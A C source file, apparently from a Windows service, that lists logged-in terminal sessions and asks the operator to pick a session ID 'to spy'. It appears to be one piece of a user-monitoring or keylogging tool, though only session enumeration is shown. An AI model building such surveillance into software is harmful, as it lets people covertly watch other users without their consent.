#include "svc.h"

/**
 * Cette fonction sert a trouver la session active, c'est a dire celle connectee au clavier + souris.
 */
DWORD GetActiveSessionId(void)
{
    WTS_SESSION_INFOA *sessionInfos;
    DWORD nbOfSessions;
    DWORD activeSession = 0;
    BOOL sessions = WTSEnumerateSessionsA(WTS_CURRENT_SERVER_HANDLE, 0, 1, &sessionInfos, &nbOfSessions);
    if (sessions == FALSE)
    {
        log("WTSEnumerateSessionsA failed.\n");
        ReportSvcStatus(SERVICE_STOPPED, GetLastError(), 0);
        exit(1);
    }
    for (DWORD i = 0; i != nbOfSessions; ++i)
    {
        if (sessionInfos[i].State == WTSActive)
        {
            activeSession = sessionInfos[i].SessionId;
            break;
        }
    }
    WTSFreeMemory(sessionInfos);
    return activeSession;
}

static char *GetSessionState(WTS_CONNECTSTATE_CLASS state)
{
    switch (state)
    {
    case WTSActive:
        return "Active";
        break;
    case WTSConnected:
        return "Connected";
        break;
    case WTSConnectQuery:
        return "ConnectQuery";
        break;
    case WTSShadow:
        return "Shadow";
        break;
    case WTSDisconnected:
        return "Disconnected";
        break;
    case WTSIdle:
        return "Idle";
        break;
    case WTSListen:
        return "Listen";
        break;
    case WTSReset:
        return "Reset";
        break;
    case WTSDown:
        return "Down";
        break;
    case WTSInit:
        return "Init";
        break;
    default:
        return "Invalid State";
        break;
    }
}

DWORD ChooseSessionToLog(void)
{
    PWTS_SESSION_INFO_1W sessionsInfos;
    DWORD nbOfSessions;
    DWORD level = 1;
    BOOL sucess = WTSEnumerateSessionsExW(WTS_CURRENT_SERVER_HANDLE, &level, 0, &sessionsInfos, &nbOfSessions);
    int choice;
    if (sucess == FALSE)
    {
        printf("WTSEnumerateSessionsExA failed.\n");
        return 0;
    }  
    for (DWORD i = 0; i != nbOfSessions; i++)
    {
        if (sessionsInfos[i].SessionId)
            printf("Session ID %ld  | User %ls | Domain %ls | State %s\n", sessionsInfos[i].SessionId, sessionsInfos[i].pUserName, sessionsInfos[i].pDomainName, GetSessionState(sessionsInfos[i].State));
    }
    printf("Choose the Session ID you want to spy :\n");
    scanf_s("%d", &choice);
    if (choice >= (int)nbOfSessions || choice < 1 || choice > 20)
    {
        printf("Invalid number. Defaulting to active session.\n");
        WTSFreeMemory(sessionsInfos);
        return GetActiveSessionId();
    }
    WTSFreeMemory(sessionsInfos);
    return (DWORD)choice;
}
